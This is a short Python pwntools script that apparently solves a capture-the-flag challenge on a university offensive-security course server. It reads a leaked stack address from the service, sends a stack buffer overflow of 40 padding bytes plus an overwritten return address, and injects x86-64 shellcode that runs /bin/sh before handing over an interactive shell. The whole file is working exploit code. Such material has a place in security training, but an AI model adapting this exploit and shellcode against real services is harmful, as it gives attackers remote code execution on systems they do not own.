#!/usr/bin/env python

import sys
from pwn import *

REMOTE = True

bridge = ELF(sys.argv[1])
if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)
    p.recvuntil(":")
    p.sendline("joe215")
else:
    p = process(sys.argv[1])
    #gdb.attach(p)

mystr = p.recvuntil(". gimme")
rsp = p64(int(mystr[-21:-7], 16) + 48 )
print(hex(int(mystr[-21:-7], 16) + 48))

#shc = "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05".decode('hex')
shc = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
print(mystr)
print(p.recvuntil("directions:"))
exploit = 40 * "A" + rsp + shc


p.sendline(exploit)
p.interactive()
